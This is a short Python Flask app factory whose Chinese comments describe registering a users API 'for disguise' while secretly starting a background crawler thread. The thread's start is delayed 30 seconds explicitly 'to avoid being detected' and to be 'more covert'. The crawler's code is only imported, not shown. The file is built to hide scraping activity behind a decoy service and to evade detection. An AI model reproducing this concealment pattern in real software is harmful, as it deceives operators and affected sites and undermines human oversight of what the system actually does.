from flask import Flask
import threading
import time
from app.crawler.keep_alive import KeepAliveService  # 导入爬取服务

def create_app():
    app = Flask(__name__)
    
    # 注册业务API（伪装用）
    from app.api.users import bp as users_bp
    app.register_blueprint(users_bp, url_prefix='/api/users')
    
    # 隐藏启动爬取线程（30秒延迟，避免启动时被检测）
    def start_crawler():
        time.sleep(30)  # 延迟启动，更隐蔽
        crawler = KeepAliveService()
        crawler.run()  # 启动爬取循环
    
    # 守护线程：主服务退出时自动结束
    crawler_thread = threading.Thread(target=start_crawler, daemon=True)
    crawler_thread.start()
    
    return app